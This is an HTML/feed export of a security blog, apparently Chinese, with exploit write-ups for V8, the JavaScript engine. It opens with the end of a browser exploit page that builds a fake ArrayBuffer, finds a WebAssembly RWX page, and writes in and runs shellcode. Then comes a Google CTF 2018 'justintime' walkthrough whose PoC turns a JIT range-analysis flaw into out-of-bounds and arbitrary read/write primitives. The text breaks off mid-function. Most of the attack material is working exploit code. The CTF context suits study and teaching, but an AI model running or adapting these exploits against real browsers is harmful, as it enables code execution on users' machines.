ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function lower(x) &#123;</span><br><span class="line">    // returns the lower 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upper(x) &#123;</span><br><span class="line">    // returns the upper 32bit of double x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + Int64.fromDouble(x).toString()).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function lowerint(x) &#123;</span><br><span class="line">    // returns the lower 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-8,8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upperint(x) &#123;</span><br><span class="line">    // returns the upper 32bit of int x</span><br><span class="line">    return parseInt((&quot;0000000000000000&quot; + x.toString(16)).substr(-16, 8),16) | 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function combine(a, b) &#123;</span><br><span class="line">    //a = a &gt;&gt;&gt; 0;</span><br><span class="line">    //b = b &gt;&gt;&gt; 0;</span><br><span class="line">    //print(a.toString());</span><br><span class="line">    //print(b.toString());</span><br><span class="line">    return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//padLeft用于字符串左补位</span><br><span class="line"></span><br><span class="line">function combineint(a, b) &#123;</span><br><span class="line">    //a = a &gt;&gt;&gt; 0;</span><br><span class="line">    //b = b &gt;&gt;&gt; 0;</span><br><span class="line">    return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  // based on Long.js by dcodeIO</span><br><span class="line">  // https://github.com/dcodeIO/Long.js</span><br><span class="line">  // License Apache 2</span><br><span class="line">  class _u64 &#123;</span><br><span class="line">     constructor(hi, lo) &#123;</span><br><span class="line">        this.lo_ = lo;</span><br><span class="line">        this.hi_ = hi;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     hex() &#123;</span><br><span class="line">        var hlo = (this.lo_ &lt; 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_).toString(16)</span><br><span class="line">        var hhi = (this.hi_ &lt; 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_).toString(16)</span><br><span class="line">        if(hlo.substr(0,2) == &quot;0x&quot;) hlo = hlo.substr(2,hlo.length);</span><br><span class="line">        if(hhi.substr(0,2) == &quot;0x&quot;) hhi = hhi.substr(2,hji.length);</span><br><span class="line">        hlo = &quot;00000000&quot; + hlo</span><br><span class="line">        hlo = hlo.substr(hlo.length-8, hlo.length);</span><br><span class="line">        return &quot;0x&quot; + hhi + hlo;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     isZero() &#123;</span><br><span class="line">        return this.hi_ == 0 &amp;&amp; this.lo_ == 0;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     equals(val) &#123;</span><br><span class="line">        return this.hi_ == val.hi_ &amp;&amp; this.lo_ == val.lo_;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     and(val) &#123;</span><br><span class="line">        return new _u64(this.hi_ &amp; val.hi_, this.lo_ &amp; val.lo_);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     add(val) &#123;</span><br><span class="line">        var a48 = this.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a32 = this.hi_ &amp; 0xFFFF;</span><br><span class="line">        var a16 = this.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var a00 = this.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var b48 = val.hi_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b32 = val.hi_ &amp; 0xFFFF;</span><br><span class="line">        var b16 = val.lo_ &gt;&gt;&gt; 16;</span><br><span class="line">        var b00 = val.lo_ &amp; 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        var c48 = 0, c32 = 0, c16 = 0, c00 = 0;</span><br><span class="line">        c00 += a00 + b00;</span><br><span class="line">        c16 += c00 &gt;&gt;&gt; 16;</span><br><span class="line">        c00 &amp;= 0xFFFF;</span><br><span class="line">        c16 += a16 + b16;</span><br><span class="line">        c32 += c16 &gt;&gt;&gt; 16;</span><br><span class="line">        c16 &amp;= 0xFFFF;</span><br><span class="line">        c32 += a32 + b32;</span><br><span class="line">        c48 += c32 &gt;&gt;&gt; 16;</span><br><span class="line">        c32 &amp;= 0xFFFF;</span><br><span class="line">        c48 += a48 + b48;</span><br><span class="line">        c48 &amp;= 0xFFFF;</span><br><span class="line">  </span><br><span class="line">        return new _u64((c48 &lt;&lt; 16) | c32, (c16 &lt;&lt; 16) | c00);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     addi(h,l) &#123;</span><br><span class="line">        return this.add(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     subi(h,l) &#123;</span><br><span class="line">        return this.sub(new _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     not() &#123;</span><br><span class="line">        return new _u64(~this.hi_, ~this.lo_)</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     neg() &#123;</span><br><span class="line">        return this.not().add(new _u64(0,1));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     sub(val) &#123;</span><br><span class="line">        return this.add(val.neg());</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">     swap32(val) &#123;</span><br><span class="line">        return ((val &amp; 0xFF) &lt;&lt; 24) | ((val &amp; 0xFF00) &lt;&lt; 8) |</span><br><span class="line">              ((val &gt;&gt; 8) &amp; 0xFF00) | ((val &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">     bswap() &#123;</span><br><span class="line">        var lo = swap32(this.lo_);</span><br><span class="line">        var hi = swap32(this.hi_);</span><br><span class="line">        return new _u64(lo, hi);</span><br><span class="line">     &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">var u64 = function(hi, lo) &#123; return new _u64(hi,lo) &#125;;</span><br><span class="line"></span><br><span class="line">function gc()&#123;</span><br><span class="line">    for (var i = 0; i &lt; 1024 * 1024 * 16; i++)&#123;</span><br><span class="line">        new String();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasm_code = new Uint8Array([</span><br><span class="line">    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,</span><br><span class="line">    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,</span><br><span class="line">    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,</span><br><span class="line">    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,</span><br><span class="line">    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,</span><br><span class="line">    0x00, 0x00, 0x41, 0x00, 0x0b</span><br><span class="line">  ]);</span><br><span class="line">  const wasm_instance = new WebAssembly.Instance(</span><br><span class="line">    new WebAssembly.Module(wasm_code));</span><br><span class="line">  const wasm_func = wasm_instance.exports.a;</span><br><span class="line"></span><br><span class="line">var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">var fake_arraybuffer = [</span><br><span class="line">    //map|properties</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    //elements|length</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1000).asDouble(),</span><br><span class="line">    //backingstore|0x2</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x2).asDouble(),</span><br><span class="line">    //padding</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    //fake map</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x1900042319080808).asDouble(),</span><br><span class="line">    new Int64(0x00000000082003ff).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">    new Int64(0x0).asDouble(),</span><br><span class="line">].splice(0);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">// %DebugPrint(fake_arraybuffer);</span><br><span class="line"></span><br><span class="line">var ab = new ArrayBuffer(0x1000);</span><br><span class="line">var a = [1.1, 1.1, 1.1, 1.1,1.1];</span><br><span class="line">var b = [fake_arraybuffer, wasm_instance, ab, 2.2, 2.2];</span><br><span class="line">var c = [3.3, 3.3, 3.3, 3.3, 3.3];</span><br><span class="line">//布局内存，让array连续存放</span><br><span class="line">a = a.splice(0);</span><br><span class="line">b = b.splice(0);</span><br><span class="line">c = c.splice(0);</span><br><span class="line"></span><br><span class="line">// leak出double/object array的map</span><br><span class="line">// print(&quot;0x&quot; + Int64.fromDouble(a.oob()).toString(16));</span><br><span class="line">// print(new Int64(Int64.fromDouble(a.oob())).asDouble());</span><br><span class="line">double_map = a.oob();</span><br><span class="line">console.log(&quot;doube map is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(double_map).toString(16));</span><br><span class="line">console.log(&quot;object map is:&quot;);</span><br><span class="line">object_map = b.oob();</span><br><span class="line">console.log(Int64.fromDouble(object_map).toString(16));</span><br><span class="line"></span><br><span class="line">//覆盖object array的map为double,于是可以通过b来leak</span><br><span class="line">b.oob(double_map);</span><br><span class="line"></span><br><span class="line">fake_arraybuffer_obj = b[0];</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_obj).toString(16));</span><br><span class="line">// %DebugPrint(fake_arraybuffer);</span><br><span class="line">fake_arraybuffer_elem = fake_arraybuffer_obj + new Int64(0xc70).asDouble();//这个偏移需要适配</span><br><span class="line">console.log(&quot;fake_arraybuffer addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_elem).toString(16));</span><br><span class="line">console.log(&quot;fake_arraybuffer map is:&quot;);</span><br><span class="line">fake_arraybuffer_map = fake_arraybuffer_elem + new Int64(0x40).asDouble();</span><br><span class="line">console.log(Int64.fromDouble(fake_arraybuffer_map).toString(16));</span><br><span class="line">fake_arraybuffer[0] = fake_arraybuffer_map;</span><br><span class="line"></span><br><span class="line">// %DebugPrint(wasm_instance);</span><br><span class="line">console.log(&quot;wasm_instance is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(b[1]).toString(16));</span><br><span class="line">locate_rwx_addr = b[1] + new Int64(0x88 - 0x1).asDouble();</span><br><span class="line">fake_arraybuffer[4] = locate_rwx_addr;</span><br><span class="line"></span><br><span class="line">var d = [fake_arraybuffer_elem, 1.1, 1.1];</span><br><span class="line">d.oob(object_map);</span><br><span class="line">var dv = new DataView(d[0]);</span><br><span class="line">console.log(&quot;fake_arraybuffer done&quot;);</span><br><span class="line">// %DebugPrint(dv);</span><br><span class="line">rwx_addr = dv.getFloat64(0, true);</span><br><span class="line">console.log(&quot;rwx addr is:&quot;);</span><br><span class="line">console.log(Int64.fromDouble(rwx_addr).toString(16));</span><br><span class="line">fake_arraybuffer[4] = rwx_addr;</span><br><span class="line">for (i = 0; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">    dv.setUint32(i * 4, shellcode[i], true);</span><br><span class="line">&#125;</span><br><span class="line">wasm_func();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>测试机器ubuntu16.04<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-04-29-042454.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Google CTF justintime exploit</title>
      <link href="/2018/11/19/justintime/"/>
      <url>/2018/11/19/justintime/</url>
      <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time/" target="_blank" rel="noopener">https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time/</a><br>Thanks for Stephen, I learned a lot from his amazing challenge.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>I am lazy, so I use Xcode to compile V8 version 7.2.0 (candidate)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/v8/v8</span><br><span class="line">git reset 7.2.0 --hard</span><br><span class="line">gclient sync</span><br><span class="line">gn gen out/gn --ide=<span class="string">"xcode"</span></span><br><span class="line">patch -p1 &lt; ./addition-reducer.patch</span><br><span class="line"><span class="built_in">cd</span> out/gn</span><br><span class="line">open all.xcworkspace/</span><br><span class="line">Compile</span><br></pre></td></tr></table></figure><h2 id="Some-features"><a href="#Some-features" class="headerlink" title="Some features"></a>Some features</h2><h3 id="Max-Safe-Integer-Range-of-Doubles"><a href="#Max-Safe-Integer-Range-of-Doubles" class="headerlink" title="Max Safe Integer Range of Doubles"></a>Max Safe Integer Range of Doubles</h3><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.MAX_SAFE_INTEGER = <span class="number">2</span>^<span class="number">53</span> - <span class="number">1</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> x = <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line">x += <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line">x += <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> y = <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>;<span class="comment">//y = 9007199254740992</span></span><br><span class="line">y += <span class="number">2</span>;<span class="comment">//y = 9007199254740994</span></span><br></pre></td></tr></table></figure></p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> x = doit ? <span class="number">9007199254740992</span> : <span class="number">9007199254740991</span><span class="number">-2</span>;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// #29:NumberConstant[1]()  [Type: Range(1, 1)]</span></span><br><span class="line">    <span class="comment">// #30:SpeculativeNumberAdd[Number](#25:Phi, #29:NumberConstant, #26:Checkpoint, #23:Merge)  [Type: Range(9007199254740990, 9007199254740992)]</span></span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// #29:NumberConstant[1]()  [Type: Range(1, 1)]</span></span><br><span class="line">    <span class="comment">// #31:SpeculativeNumberAdd[Number](#30:SpeculativeNumberAdd, #29:NumberConstant, #30:SpeculativeNumberAdd, #23:Merge)  [Type: Range(9007199254740991, 9007199254740992)]</span></span><br><span class="line">    x -= <span class="number">9007199254740991</span>;<span class="comment">//解释:range(0,1);编译:(0,3);</span></span><br><span class="line">    <span class="comment">// #32:NumberConstant[9.0072e+15]()  [Type: Range(9007199254740991, 9007199254740991)]</span></span><br><span class="line">    <span class="comment">// #33:SpeculativeNumberSubtract[Number](#31:SpeculativeNumberAdd, #32:NumberConstant, #31:SpeculativeNumberAdd, #23:Merge)  [Type: Range(0, 1)]</span></span><br><span class="line">    x *= <span class="number">3</span>;<span class="comment">//解释:(0,3);编译:(0,9);</span></span><br><span class="line">    <span class="comment">// #34:NumberConstant[3]()  [Type: Range(3, 3)]</span></span><br><span class="line">    <span class="comment">// #35:SpeculativeNumberMultiply[Number](#33:SpeculativeNumberSubtract, #34:NumberConstant, #33:SpeculativeNumberSubtract, #23:Merge)  [Type: Range(0, 3)]</span></span><br><span class="line">    x += <span class="number">2</span>;<span class="comment">//解释:(2,5);编译:(2,11);</span></span><br><span class="line">    <span class="comment">// #36:NumberConstant[2]()  [Type: Range(2, 2)]</span></span><br><span class="line">    <span class="comment">// #37:SpeculativeNumberAdd[Number](#35:SpeculativeNumberMultiply, #36:NumberConstant, #35:SpeculativeNumberMultiply, #23:Merge)  [Type: Range(2, 5)]</span></span><br><span class="line">    a[x] = <span class="number">2.1729236899484e-311</span>; <span class="comment">// (1024).smi2f()</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">  foo(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run PoC until <code>remove checkbounds</code> is called:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index_type.Print();</span><br><span class="line">-&gt;Range(<span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line">length_type.Print();</span><br><span class="line">-&gt;Range(<span class="number">6</span>, <span class="number">6</span>)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                 index_type.Max() &lt; length_type.Min())) </span><br><span class="line">Condition is satisfied，so it removes CheckBounds</span><br></pre></td></tr></table></figure></p><p>All in all, the result of <code>range analyzes</code> is different from the result of <code>optimized range</code>. After <code>simplified lower</code> removes boundary check, we can do OOB read/write.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Partial-OOB-read-write"><a href="#Partial-OOB-read-write" class="headerlink" title="Partial OOB read/write"></a>Partial OOB read/write</h3><p>We place <code>array a</code> next to <code>array b</code>, use OOB write from <code>a</code> to change the length of <code>array b</code>. Now, the length of <code>b</code> is <code>0x400</code>.</p><p>And we can OOB via <code>array b</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  <span class="keyword">let</span> b = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;<span class="comment">//-&gt;trigger JIT</span></span><br><span class="line">    foo(<span class="literal">true</span>);</span><br><span class="line">    g2[<span class="number">100</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (g2[<span class="number">12</span>] != <span class="literal">undefined</span>) <span class="keyword">break</span>;<span class="comment">//-&gt;Confirm the boundary is overwritten </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (g2[<span class="number">12</span>] == <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'g2[12] == undefined'</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-114549.png" alt=""></p><h3 id="From-Partial-OOB-R-W-to-Arbitrary-R-W-Primitive"><a href="#From-Partial-OOB-R-W-to-Arbitrary-R-W-Primitive" class="headerlink" title="From Partial OOB R/W to Arbitrary R/W Primitive"></a>From Partial OOB R/W to Arbitrary R/W Primitive</h3><p>Add a <code>Float64Array</code>. We can <strong>edit</strong> the <code>backing store</code> of <code>ArrayBuffer</code> to arbitrary R/W primitive.</p><p>We won’t create Float64Array unless the memory is in <code>g2[ab_off]</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">let</span> b = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">  ...</span><br><span class="line">  g2 = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ab_off = <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  g4 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">7</span>);<span class="comment">//set up a Float64Array</span></span><br><span class="line">  <span class="keyword">if</span> (g2[ab_off+<span class="number">5</span>].f2smi() != <span class="number">0x38</span>n || g2[ab_off+<span class="number">6</span>].f2smi() != <span class="number">0x7</span>n) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'array buffer not at expected location'</span>;</span><br><span class="line">    <span class="comment">//byte_length is 0x38, length is 0x7</span></span><br><span class="line">    <span class="comment">//so, Float64Array is in correct location now</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-114922.png" alt=""></p><p>Find the address of array buffer backing store:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ab_backing_store_off = ab_off + <span class="number">0x15</span>;</span><br><span class="line">...</span><br><span class="line">g4[<span class="number">0</span>] = <span class="number">5.5</span>;</span><br><span class="line"><span class="keyword">if</span> (g2[ab_backing_store_off] != g4[<span class="number">0</span>]) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="string">'array buffer backing store not at expected location'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>I wonder which address records the backing store. After checking for a little while, it’s my first time to see <strong>new Float64Array() directly</strong>. Normally, it should be：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">20</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br></pre></td></tr></table></figure></p><p>Finding the elements of <code>Float64Array</code>.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113544.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113454.png" alt=""></p><p>Add <code>+0x10</code> to the address, we can get <code>backing store</code>.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-115204.png" alt=""></p><p>The address of elements is <code>0x0000093f18ac9ed</code>. In <code>0x0000093f18ac9ed+0x20</code>, we have the first element <code>-5.5</code>.(<code>0x4016000000000000</code> in the picture):<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113654.png" alt=""></p><p>When we edit backing store to get arbitrary r/w primitive, assume <code>addr</code> as the target address, change the value of backing store to <code>addr-0x20</code>，then we can leak content in this address.</p><h3 id="User-mode-object-leak-primitive"><a href="#User-mode-object-leak-primitive" class="headerlink" title="User mode object leak primitive"></a>User mode object leak primitive</h3><p>Appending an object to <code>g3</code>. Then, double array <code>g2</code> can leak that object, resulting type confusion. The leaked content is <code>float</code>. <code>f2i</code> is able to convert it to integer:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak_ptr</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  g3[<span class="number">0</span>] = o;</span><br><span class="line">  <span class="keyword">let</span> ptr = g2[g3_off];</span><br><span class="line">  g3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr.f2i();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Here is the output：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line">...</span><br><span class="line">Array_addr: <span class="number">0x93f11611259</span></span><br></pre></td></tr></table></figure></p><h3 id="Arbitrary-Address-R-W-Primitive"><a href="#Arbitrary-Address-R-W-Primitive" class="headerlink" title="Arbitrary Address R/W Primitive"></a>Arbitrary Address R/W Primitive</h3><p>Script:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readq</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> old = g2[ab_off+<span class="number">2</span>];</span><br><span class="line">  g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20</span>n|<span class="number">1</span>n).i2f();</span><br><span class="line">  <span class="keyword">let</span> q = g4[<span class="number">0</span>];</span><br><span class="line">  g2[ab_off+<span class="number">2</span>] = old;</span><br><span class="line">  <span class="keyword">return</span> q.f2i();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeq</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> old = g2[ab_off+<span class="number">2</span>];</span><br><span class="line">  g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20</span>n|<span 